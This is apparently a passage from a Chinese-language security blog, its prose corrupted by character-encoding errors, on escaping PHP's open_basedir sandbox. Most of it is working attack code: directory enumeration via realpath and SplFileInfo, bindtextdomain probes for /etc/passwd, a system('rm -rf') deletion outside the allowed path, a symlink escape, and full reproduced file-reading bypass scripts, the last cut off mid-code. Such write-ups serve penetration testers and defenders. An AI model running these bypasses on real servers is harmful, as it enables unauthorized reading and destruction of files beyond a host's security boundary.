</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>, dirname(<span class="keyword">__FILE__</span>));</span><br><span class="line">printf(<span class="string">"&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;"</span>, ini_get(<span class="string">'open_basedir'</span>));</span><br><span class="line">set_error_handler(<span class="string">'isexists'</span>);</span><br><span class="line">$dir = <span class="string">'e:/share/'</span>;</span><br><span class="line">$file = <span class="string">''</span>;</span><br><span class="line">$chars = <span class="string">'abcdefghijklmnopqrstuvwxyz0123456789_'</span>;</span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; strlen($chars); $i++) &#123; </span><br><span class="line">    $file = $dir . $chars[$i] . <span class="string">'&lt;&gt;&lt;'</span>;</span><br><span class="line">    realpath($file);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isexists</span><span class="params">($errno, $errstr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $regexp = <span class="string">'/File\((.*)\) is not within/'</span>;</span><br><span class="line">    preg_match($regexp, $errstr, $matches);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($matches[<span class="number">1</span>])) &#123;</span><br><span class="line">        printf(<span class="string">"%s &lt;br/&gt;"</span>, $matches[<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/php-about/open-base-dir/realpath-list.png" alt="realpath-list"></p>
<h5 id="SplFileInfo-getRealPath"><a href="#SplFileInfo-getRealPath" class="headerlink" title="SplFileInfo::getRealPath"></a>SplFileInfo::getRealPath</h5><ul>
<li><p>â–² realpathçš„æ›¿ä»£æ–¹æ³•</p>
</li>
<li><p>æ¦‚å¿µ</p>
<ul>
<li>SplFileInfoç±»æ˜¯PHP5.1.2ä¹‹åå¼•å…¥çš„ä¸€ä¸ªç±»ï¼Œæä¾›ä¸€ä¸ªå¯¹æ–‡ä»¶è¿›è¡Œæ“ä½œçš„æ¥å£ã€‚å…¶ä¸­æœ‰ä¸€ä¸ªå’Œrealpathåå­—å¾ˆåƒçš„æ–¹æ³•å«getRealPath</li>
<li>è¿™ä¸ªæ–¹æ³•åŠŸèƒ½å’Œrealpathç±»ä¼¼ï¼Œéƒ½æ˜¯è·å–ç»å¯¹è·¯å¾„ç”¨çš„ã€‚æˆ‘ä»¬åœ¨SplFileInfoçš„æ„é€ å‡½æ•°ä¸­ä¼ å…¥æ–‡ä»¶ç›¸å¯¹è·¯å¾„ï¼Œå¹¶ä¸”è°ƒç”¨getRealPathå³å¯è·å–æ–‡ä»¶çš„ç»å¯¹è·¯å¾„</li>
</ul>
</li>
<li><p>åˆ©ç”¨</p>
<ul>
<li>â–² æ­¤æ–¹æ³•å®Œå…¨æ²¡æœ‰è€ƒè™‘open_basedirï¼Œåœ¨è¿™ç‚¹ä¸Šä¸åŒäºrealpath</li>
<li>åœ¨ä¼ å…¥çš„è·¯å¾„ä¸ºä¸€ä¸ªä¸å­˜åœ¨çš„è·¯å¾„æ—¶ï¼Œä¼šè¿”å›false</li>
<li>åœ¨ä¼ å…¥çš„è·¯å¾„ä¸ºä¸€ä¸ªå­˜åœ¨çš„è·¯å¾„æ—¶ï¼Œä¼šæ­£å¸¸è¿”å›ç»å¯¹è·¯å¾„</li>
</ul>
</li>
<li><p>æµ‹è¯•ä»£ç </p>
<ul>
<li>â–² åŒæ ·çš„æ­¤æ–¹æ³•æ˜¯windowsä¸‹phpç‰ˆæœ¬é€šç”¨ï¼Œåœ¨Linuxç¯å¢ƒä¸‹å°±åªèƒ½æš´åŠ›ç ´è§£äº†</li>
</ul>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>, dirname(<span class="keyword">__FILE__</span>));</span><br><span class="line">printf(<span class="string">"&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;"</span>, ini_get(<span class="string">'open_basedir'</span>));</span><br><span class="line">$basedir = <span class="string">'e:/github/'</span>;</span><br><span class="line">$arr = <span class="keyword">array</span>();</span><br><span class="line">$chars = <span class="string">'abcdefghijklmnopqrstuvwxyz0123456789'</span>;</span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; strlen($chars); $i++) &#123; </span><br><span class="line">    $info = <span class="keyword">new</span> SplFileInfo($basedir . $chars[$i] . <span class="string">'&lt;&gt;&lt;'</span>);</span><br><span class="line">    $re = $info-&gt;getRealPath();</span><br><span class="line">    <span class="keyword">if</span> ($re) &#123;</span><br><span class="line">        dump($re);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dump</span><span class="params">($s)</span></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> $s . <span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line">    ob_flush();</span><br><span class="line">    flush();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/php-about/open-base-dir/splfileinfo-getrealpath-list.png" alt="splfileinfo-getrealpath-list"></p>
<h5 id="bindtextdomainæš´åŠ›çŒœè§£"><a href="#bindtextdomainæš´åŠ›çŒœè§£" class="headerlink" title="bindtextdomainæš´åŠ›çŒœè§£"></a>bindtextdomainæš´åŠ›çŒœè§£</h5><ul>
<li><p>æ¦‚å¿µ</p>
<ul>
<li>bindtextdomainæ˜¯phpä¸‹ç»‘å®šdomainåˆ°æŸä¸ªç›®å½•çš„å‡½æ•°</li>
<li>â–² Bindtextdomainå‡½æ•°åœ¨ç¯å¢ƒæ”¯æŒGettext Functionsçš„æ—¶å€™æ‰èƒ½ä½¿ç”¨ï¼Œè€Œwindowsç¯å¢ƒä¸‹æ˜¯æ²¡æœ‰bindtextdomainå‡½æ•°çš„ï¼Œlinuxç¯å¢ƒæ˜¯é»˜è®¤å­˜åœ¨è¿™ä¸ªå‡½æ•°</li>
<li>â–² æ­¤å‡½æ•°æ–¹æ³•æ˜¯ä¸è€ƒè™‘open_basedirçš„</li>
</ul>
</li>
<li><p>åˆ©ç”¨ï¼šbindtextdomainçš„ç¬¬äºŒä¸ªå‡½æ•°<code>$directory</code>æ˜¯ä¸€ä¸ªæ–‡ä»¶è·¯å¾„ï¼Œä¼šåœ¨<code>$directory</code>å­˜åœ¨çš„æ—¶å€™è¿”å›<code>$directory</code>ï¼Œä¸å­˜åœ¨åˆ™è¿”å›false</p>
</li>
<li><p>æµ‹è¯•ä»£ç </p>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">printf(<span class="string">'&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;'</span>, ini_get(<span class="string">'open_basedir'</span>));</span><br><span class="line">$re = bindtextdomain(<span class="string">'xxx'</span>, $_GET[<span class="string">'dir'</span>]);</span><br><span class="line">var_dump($re);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>å½“/etc/passwdå­˜åœ¨çš„æ—¶å€™è¾“å‡º</li>
</ul>
<p><img src="/images/php-about/open-base-dir/bindtextdomain-etc-passwd.png" alt="bindtextdomain-etc-passwd"></p>
<ul>
<li>å½“/etc/tomasä¸å­˜åœ¨çš„æ—¶å€™ä¼šè¿”å›false</li>
</ul>
<p><img src="/images/php-about/open-base-dir/bindtextdomain-etc-tomas.png" alt="bindtextdomain-etc-tomas"></p>
<h3 id="0X01-æ“ä½œæ–‡ä»¶"><a href="#0X01-æ“ä½œæ–‡ä»¶" class="headerlink" title="0X01 æ“ä½œæ–‡ä»¶"></a>0X01 æ“ä½œæ–‡ä»¶</h3><h5 id="å‘½ä»¤æ‰§è¡Œå‡½æ•°"><a href="#å‘½ä»¤æ‰§è¡Œå‡½æ•°" class="headerlink" title="å‘½ä»¤æ‰§è¡Œå‡½æ•°"></a>å‘½ä»¤æ‰§è¡Œå‡½æ•°</h5><ul>
<li><p>èƒŒæ™¯ï¼šç”±äºopen_basedirçš„è®¾ç½®å¯¹systemç­‰å‘½ä»¤æ‰§è¡Œå‡½æ•°æ˜¯æ— æ•ˆçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å‘½ä»¤æ‰§è¡Œå‡½æ•°æ¥è®¿é—®é™åˆ¶ç›®å½•</p>
</li>
<li><p>åˆ©ç”¨</p>
<ul>
<li>åˆ›å»ºä¸€ä¸ªç›®å½•testï¼Œå¹¶æ–°å»º1.txtï¼Œå†…å®¹ä¸ºâ€abcâ€œï¼š<code>mkdir /home/tomas/test &amp;&amp; cd /home/tomas/test &amp;&amp; echo &quot;abc&quot; &gt; 1.txt</code></li>
<li>åœ¨testç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªç›®å½•bï¼Œæ–°å»ºä¸€ä¸ª1.phpï¼Œå¹¶å†™å…¥phpä»£ç ï¼š<code>mkdir b &amp;&amp; vi 1.php</code></li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">     <span class="keyword">echo</span> file_get_contents(<span class="string">"../1.txt"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>åœ¨php.iniä¸­è®¾ç½®open_basedirï¼š<code>open_basedir = /home/tomas/test/b</code></p>
</li>
<li><p>æ‰§è¡Œ1.phpï¼Œå‘ç°é™åˆ¶äº†è®¿é—®</p>
</li>
<li><p>ä¿®æ”¹1.phpçš„æ–‡ä»¶å†…å®¹ä¸º</p>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    system(<span class="string">"rm -rf ../1.txt"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>å†æ¬¡æ‰§è¡Œ1.phpï¼Œå‘ç°å¯ä»¥ç»•è¿‡open_basediræ¥åˆ é™¤æ–‡ä»¶</li>
</ul>
</li>
<li><p>â–² ç”±äºå‘½ä»¤æ‰§è¡Œå‡½æ•°ä¸€èˆ¬éƒ½ä¼šè¢«é™åˆ¶åœ¨disable_functionå½“ä¸­ï¼Œæ‰€ä»¥éœ€è¦å¯»æ‰¾å…¶ä»–é€”å¾„æ¥ç»•è¿‡é™åˆ¶</p>
</li>
</ul>
<p><img src="/images/php-about/open-base-dir/system-open-basedir-execution.png" alt="system-open-basedir-execution"></p>
<h5 id="symlink-å‡½æ•°"><a href="#symlink-å‡½æ•°" class="headerlink" title="symlink()å‡½æ•°"></a>symlink()å‡½æ•°</h5><ul>
<li><p>å‰æçŸ¥è¯†</p>
<ul>
<li>ç¬¦å·é“¾æ¥åˆå«è½¯é“¾æ¥,æ˜¯ä¸€ç±»ç‰¹æ®Šçš„æ–‡ä»¶ï¼Œè¿™ä¸ªæ–‡ä»¶åŒ…å«äº†å¦ä¸€ä¸ªæ–‡ä»¶çš„è·¯å¾„å(ç»å¯¹è·¯å¾„æˆ–è€…ç›¸å¯¹è·¯å¾„)ã€‚è·¯å¾„å¯ä»¥æ˜¯ä»»æ„æ–‡ä»¶æˆ–ç›®å½•ï¼Œå¯ä»¥é“¾æ¥ä¸åŒæ–‡ä»¶ç³»ç»Ÿçš„æ–‡ä»¶ã€‚åœ¨å¯¹ç¬¦å·æ–‡ä»¶è¿›è¡Œè¯»æˆ–å†™æ“ä½œçš„æ—¶å€™ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨æŠŠè¯¥æ“ä½œè½¬æ¢ä¸ºå¯¹æºæ–‡ä»¶çš„æ“ä½œï¼Œä½†åˆ é™¤é“¾æ¥æ–‡ä»¶æ—¶ï¼Œç³»ç»Ÿä»…ä»…åˆ é™¤é“¾æ¥æ–‡ä»¶ï¼Œè€Œä¸åˆ é™¤æºæ–‡ä»¶æœ¬èº«</li>
</ul>
</li>
<li><p>åˆ©ç”¨</p>
<ul>
<li>åœ¨/var/www/htmlä¸‹æ–°å»ºä¸€ä¸ª1.php</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        mkdir(<span class="string">"c"</span>);</span><br><span class="line">        chdir(<span class="string">"c"</span>);</span><br><span class="line">        mkdir(<span class="string">"d"</span>);</span><br><span class="line">        chdir(<span class="string">"d"</span>);</span><br><span class="line">        chdir(<span class="string">".."</span>);</span><br><span class="line">        chdir(<span class="string">".."</span>);</span><br><span class="line">        symlink(<span class="string">"c/d"</span>,<span class="string">"tmplink"</span>);</span><br><span class="line">        symlink(<span class="string">"tmplink/../../1.txt"</span>,<span class="string">"exploit"</span>);</span><br><span class="line">        unlink(<span class="string">"tmplink"</span>);</span><br><span class="line">        mkdir(<span class="string">"tmplink"</span>);</span><br><span class="line">        <span class="keyword">echo</span> file_put_contents(<span class="string">"http://127.0.0.1/exploit"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>åœ¨/var/wwwä¸­æ–°å»ºä¸€ä¸ª1.txtï¼Œå†…å®¹ä¸ºâ€abcâ€</li>
<li>è®¾ç½®open_basedirï¼š<code>open_basedir=/var/www/html/</code></li>
<li>åœ¨/var/www/htmlä¸‹æ–°å»ºtest.phpæµ‹è¯•ï¼Œå‘ç°è®¿é—®å—é™</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">          file_get_contents(&quot;../1.txt&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>æ‰§è¡Œåˆšæ‰çš„è„šæœ¬1.phpï¼Œå‘ç°æˆåŠŸæ‰§è¡Œï¼Œé€ƒè„±äº†open_basedirçš„é™åˆ¶</li>
</ul>
<p><img src="/images/php-about/open-base-dir/symlink-open-basedir-execution.png" alt="symlink-open-basedir-execution"></p>
</li>
<li><p>åˆ†æ</p>
<ul>
<li><code>symlink(&quot;tmplink/../../1.txt&quot;,&quot;exploit&quot;);</code><ul>
<li>tmplinkåªæ˜¯ä¸ªç¬¦å·é“¾æ¥æ–‡ä»¶</li>
<li>è·¯å¾„ä¿®æ”¹ä¸ºï¼šc/d/../../1.txt</li>
<li>ç”±äºè·¯å¾„åœ¨open_basedirèŒƒå›´å†…ï¼Œæ‰€ä»¥exploitå»ºç«‹æˆåŠŸ</li>
</ul>
</li>
<li>åˆ é™¤tmplinkç¬¦å·é“¾æ¥æ–‡ä»¶å†æ–°å»ºä¸€ä¸ªåŒåä¸ºtmplinkçš„æ–‡ä»¶å¤¹<ul>
<li>exploitæŒ‡å‘è·¯å¾„ä¸ºtmplink/../../</li>
<li>tmplinkå˜æˆäº†çœŸå®å­˜åœ¨çš„æ–‡ä»¶å¤¹ä¸”æŒ‡å‘äº†1.txtæ‰€åœ¨çš„ç›®å½•å³/var/www</li>
</ul>
</li>
<li>å†è®¿é—®ç¬¦å·é“¾æ¥æ–‡ä»¶exploitå³å¯ä»¥è¯»å–åˆ°1.txtçš„æ–‡ä»¶å†…å®¹</li>
</ul>
</li>
</ul>
<h3 id="0X03-PHP-FPM-FastCGI-bypass-open-basedir"><a href="#0X03-PHP-FPM-FastCGI-bypass-open-basedir" class="headerlink" title="0X03 PHP-FPM/FastCGI bypass open_basedir"></a>0X03 PHP-FPM/FastCGI bypass open_basedir</h3><ul>
<li>â–² åŸºäºPHP-FPMçš„æœªæˆæƒèŒƒå›´æ¼æ´ï¼Œå¯è‡ªå®šä¹‰ä»»æ„ä»£ç æ‰§è¡Œã€</li>
<li>å‰æ<ul>
<li>tcpç›‘å¬æ–¹å¼ï¼Œç›‘å¬æ–¹å¼ä¸º0.0.0.0:9000</li>
<li>phpç»“åˆçš„æ–¹å¼ä¸ºfpm/FastCGI</li>
</ul>
</li>
<li>æ„é€ Pç‰›çš„è„šæœ¬ <a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75" target="_blank" rel="noopener">fpm.pyå…¼å®¹py3å’Œpy2</a></li>
</ul>
<p><img src="/images/php-about/disable_function/php-fpm-bypass.png" alt="php-fpm-bypass"></p>
<h3 id="0X04-è¯»å–æ–‡ä»¶è„šæœ¬"><a href="#0X04-è¯»å–æ–‡ä»¶è„šæœ¬" class="headerlink" title="0X04 è¯»å–æ–‡ä»¶è„šæœ¬"></a>0X04 è¯»å–æ–‡ä»¶è„šæœ¬</h3><h5 id="æ¥è‡ªPç‰›çš„è„šæœ¬"><a href="#æ¥è‡ªPç‰›çš„è„šæœ¬" class="headerlink" title="æ¥è‡ªPç‰›çš„è„šæœ¬"></a>æ¥è‡ªPç‰›çš„è„šæœ¬</h5><ul>
<li>ä»£ç </li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* by phithon</span></span><br><span class="line"><span class="comment">* From https://www.leavesongs.com</span></span><br><span class="line"><span class="comment">* detail: http://cxsecurity.com/issue/WLB-2009110068</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">header(<span class="string">'content-type: text/plain'</span>);</span><br><span class="line">error_reporting(<span class="number">-1</span>);</span><br><span class="line">ini_set(<span class="string">'display_errors'</span>, <span class="keyword">TRUE</span>);</span><br><span class="line">printf(<span class="string">"open_basedir: %s\nphp_version: %s\n"</span>, ini_get(<span class="string">'open_basedir'</span>), phpversion());</span><br><span class="line">printf(<span class="string">"disable_functions: %s\n"</span>, ini_get(<span class="string">'disable_functions'</span>));</span><br><span class="line">$file = str_replace(<span class="string">'\\'</span>, <span class="string">'/'</span>, <span class="keyword">isset</span>($_REQUEST[<span class="string">'file'</span>]) ? $_REQUEST[<span class="string">'file'</span>] : <span class="string">'/etc/passwd'</span>);</span><br><span class="line">$relat_file = getRelativePath(<span class="keyword">__FILE__</span>, $file);</span><br><span class="line">$paths = explode(<span class="string">'/'</span>, $file);</span><br><span class="line">$name = mt_rand() % <span class="number">999</span>;</span><br><span class="line">$exp = getRandStr();</span><br><span class="line">mkdir($name);</span><br><span class="line">chdir($name);</span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">1</span> ; $i &lt; count($paths) - <span class="number">1</span> ; $i++)&#123;</span><br><span class="line">    mkdir($paths[$i]);</span><br><span class="line">    chdir($paths[$i]);</span><br><span class="line">&#125;</span><br><span class="line">mkdir($paths[$i]);</span><br><span class="line"><span class="keyword">for</span> ($i -= <span class="number">1</span>; $i &gt; <span class="number">0</span>; $i--) &#123; </span><br><span class="line">    chdir(<span class="string">'..'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$paths = explode(<span class="string">'/'</span>, $relat_file);</span><br><span class="line">$j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $paths[$i] == <span class="string">'..'</span>; $i++) &#123; </span><br><span class="line">    mkdir($name);</span><br><span class="line">    chdir($name);</span><br><span class="line">    $j++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt;= $j; $i++) &#123; </span><br><span class="line">    chdir(<span class="string">'..'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$tmp = array_fill(<span class="number">0</span>, $j + <span class="number">1</span>, $name);</span><br><span class="line">symlink(implode(<span class="string">'/'</span>, $tmp), <span class="string">'tmplink'</span>);</span><br><span class="line">$tmp = array_fill(<span class="number">0</span>, $j, <span class="string">'..'</span>);</span><br><span class="line">symlink(<span class="string">'tmplink/'</span> . implode(<span class="string">'/'</span>, $tmp) . $file, $exp);</span><br><span class="line">unlink(<span class="string">'tmplink'</span>);</span><br><span class="line">mkdir(<span class="string">'tmplink'</span>);</span><br><span class="line">delfile($name);</span><br><span class="line">$exp = dirname($_SERVER[<span class="string">'SCRIPT_NAME'</span>]) . <span class="string">"/&#123;$exp&#125;"</span>;</span><br><span class="line">$exp = <span class="string">"http://&#123;$_SERVER['SERVER_NAME']&#125;&#123;$exp&#125;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n-----------------content---------------\n\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> file_get_contents($exp);</span><br><span class="line">delfile(<span class="string">'tmplink'</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getRelativePath</span><span class="params">($from, $to)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// some compatibility fixes for Windows paths</span></span><br><span class="line">  $from = rtrim($from, <span class="string">'\/'</span>) . <span class="string">'/'</span>;</span><br><span class="line">  $from = str_replace(<span class="string">'\\'</span>, <span class="string">'/'</span>, $from);</span><br><span class="line">  $to   = str_replace(<span class="string">'\\'</span>, <span class="string">'/'</span>, $to);</span><br><span class="line"></span><br><span class="line">  $from   = explode(<span class="string">'/'</span>, $from);</span><br><span class="line">  $to     = explode(<span class="string">'/'</span>, $to);</span><br><span class="line">  $relPath  = $to;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">foreach</span>($from <span class="keyword">as</span> $depth =&gt; $dir) &#123;</span><br><span class="line">    <span class="comment">// find first non-matching dir</span></span><br><span class="line">    <span class="keyword">if</span>($dir === $to[$depth]) &#123;</span><br><span class="line">      <span class="comment">// ignore this directory</span></span><br><span class="line">      array_shift($relPath);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// get number of remaining dirs to $from</span></span><br><span class="line">      $remaining = count($from) - $depth;</span><br><span class="line">      <span class="keyword">if</span>($remaining &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">// add traversals up to first matching dir</span></span><br><span class="line">        $padLength = (count($relPath) + $remaining - <span class="number">1</span>) * <span class="number">-1</span>;</span><br><span class="line">        $relPath = array_pad($relPath, $padLength, <span class="string">'..'</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $relPath[<span class="number">0</span>] = <span class="string">'./'</span> . $relPath[<span class="number">0</span>];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> implode(<span class="string">'/'</span>, $relPath);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">delfile</span><span class="params">($deldir)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (@is_file($deldir)) &#123;</span><br><span class="line">        @chmod($deldir,<span class="number">0777</span>);</span><br><span class="line">        <span class="keyword">return</span> @unlink($deldir);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(@is_dir($deldir))&#123;</span><br><span class="line">        <span class="keyword">if</span>(($mydir = @opendir($deldir)) == <span class="keyword">NULL</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">while</span>(<span class="keyword">false</span> !== ($file = @readdir($mydir)))</span><br><span class="line">        &#123;</span><br><span class="line">            $name = File_Str($deldir.<span class="string">'/'</span>.$file);</span><br><span class="line">            <span class="keyword">if</span>(($file!=<span class="string">'.'</span>) &amp;&amp; ($file!=<span class="string">'..'</span>))&#123;delfile($name);&#125;</span><br><span class="line">        &#125; </span><br><span class="line">        @closedir($mydir);</span><br><span class="line">        @chmod($deldir,<span class="number">0777</span>);</span><br><span class="line">        <span class="keyword">return</span> @rmdir($deldir) ? <span class="keyword">true</span> : <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">File_Str</span><span class="params">($string)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">'//'</span>,<span class="string">'/'</span>,str_replace(<span class="string">'\\'</span>,<span class="string">'/'</span>,$string));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getRandStr</span><span class="params">($length = <span class="number">6</span>)</span> </span>&#123;</span><br><span class="line">    $chars = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">    $randStr = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $length; $i++) &#123;</span><br><span class="line">        $randStr .= substr($chars, mt_rand(<span class="number">0</span>, strlen($chars) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $randStr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/images/php-about/open-base-dir/php-script-p.png" alt="php-script-p"></p>
<h5 id="æ¥è‡ªniexinmingå¸ˆå‚…çš„è„šæœ¬"><a href="#æ¥è‡ªniexinmingå¸ˆå‚…çš„è„šæœ¬" class="headerlink" title="æ¥è‡ªniexinmingå¸ˆå‚…çš„è„šæœ¬"></a>æ¥è‡ªniexinmingå¸ˆå‚…çš„è„šæœ¬</h5><ul>
<li>ä»£ç </li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">PHP open_basedir bypass collection</span></span><br><span class="line"><span class="comment">Works with &gt;= PHP5</span></span><br><span class="line"><span class="comment">By /fd, <span class="doctag">@filedescriptor</span>(https://twitter.com/filedescriptor)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// Assistant functions</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getRelativePath</span><span class="params">($from, $to)</span> </span>&#123;</span><br><span class="line">	<span class="comment">// some compatibility fixes for Windows paths</span></span><br><span class="line">	$from = rtrim($from, <span class="string">'\/'</span>) . <span class="string">'/'</span>;</span><br><span class="line">	$from = str_replace(<span class="string">'\\'</span>, <span class="string">'/'</span>, $from);</span><br><span class="line">	$to = str_replace(<span class="string">'\\'</span>, <span class="string">'/'</span>, $to);</span><br><span class="line"> </span><br><span class="line">	$from = explode(<span class="string">'/'</span>, $from);</span><br><span class="line">	$to = explode(<span class="string">'/'</span>, $to);</span><br><span class="line">	$relPath = $to;</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">foreach</span> ($from <span class="keyword">as</span> $depth =&gt; $dir) &#123;</span><br><span class="line">		<span class="comment">// find first non-matching dir</span></span><br><span class="line">		<span class="keyword">if</span> ($dir === $to[$depth]) &#123;</span><br><span class="line">			<span class="comment">// ignore this directory</span></span><br><span class="line">			array_shift($relPath);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="comment">// get number of remaining dirs to $from</span></span><br><span class="line">			$remaining = count($from) - $depth;</span><br><span class="line">			<span class="keyword">if</span> ($remaining &gt; <span class="number">1</span>) &#123;</span><br><span class="line">				<span class="comment">// add traversals up to first matching dir</span></span><br><span class="line">				$padLength = (count($relPath) + $remaining - <span class="number">1</span>) * <span class="number">-1</span>;</span><br><span class="line">				$relPath = array_pad($relPath, $padLength, <span class="string">'..'</span>);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				$relPath[<span class="number">0</span>] = <span class="string">'./'</span> . $relPath[<span class="number">0</span>];</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> implode(<span class="string">'/'</span>, $relPath);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fallback</span><span class="params">($classes)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">foreach</span> ($classes <span class="keyword">as</span> $class) &#123;</span><br><span class="line">		$object = <span class="keyword">new</span> $class;</span><br><span class="line">		<span class="keyword">if</span> ($object-&gt;isAvailable()) &#123;</span><br><span class="line">			<span class="keyword">return</span> $object;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">new</span> NoExploit;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// Core classes</span></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Exploitable</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">isAvailable</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">getDescription</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NoExploit</span> <span class="keyword">implements</span> <span class="title">Exploitable</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">isAvailable</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">getDescription</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">'No exploit is available.'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> 